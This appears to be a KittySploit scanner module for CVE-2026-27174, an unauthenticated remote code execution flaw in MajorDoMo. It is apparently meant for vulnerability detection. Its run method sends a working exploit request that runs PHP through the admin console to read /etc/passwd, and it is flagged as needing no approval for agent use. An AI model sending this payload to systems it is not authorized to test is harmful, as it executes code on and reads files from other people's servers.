#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MajorDoMo contains a remote code execution caused by an include order bug and lack of exit after redirect in a."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MajorDoMo - Unauthenticated RCE Detection',
        'description': "MajorDoMo contains a remote code execution caused by an include order bug and lack of exit after redirect in admin panel's PHP console, letting unauthenticated attackers execute arbitrary PHP code via crafted GET requests.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'rce', 'majordomo', 'php', 'unauth', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2026-27174',
            'https://github.com/sergejey/majordomo/issues/1177',
            'https://chocapikk.com/posts/2026/majordomo-revisited',
            'https://www.vulncheck.com/advisories/majordomo-unauthenticated-remote-code-execution-via-admin-console-eval',
        ],
        'cve': 'CVE-2026-27174',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/admin.php?ajax_panel=1&op=console&command=echo+file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='MajorDoMo - Unauthenticated RCE detected', path=path)
            return True
        return False

